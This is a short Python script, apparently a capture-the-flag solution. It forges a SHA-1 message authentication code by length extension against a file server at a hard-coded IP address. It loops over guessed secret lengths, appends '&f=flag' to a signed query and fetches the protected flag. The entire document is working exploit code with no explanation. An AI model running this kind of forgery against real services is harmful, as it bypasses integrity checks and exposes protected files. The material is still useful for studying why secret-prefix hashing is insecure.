import requests
import hlextend

base = "http://35.198.133.163:1337/files/"
sha = hlextend.new('sha1')

for saltLen in range(13, 20, 1):
    print("Attempting with len(SECRET)= " + str(saltLen))

    query = sha.extend('&f=flag', "f=sample.gif", saltLen, "952bb2a215b032abe27d24296be099dc3334755c")
    umac = sha.hexdigest()

    query = repr(query).replace("\\\\x","%")[1:-1]
    url = base + umac + "/?" + query
    r = requests.get(url)

    # if no redirect, success!
    if(url == r.url):
        print("Hash found!\n")
        print("Url: " + url)
        print("\nFlag: " + r.text)
        break
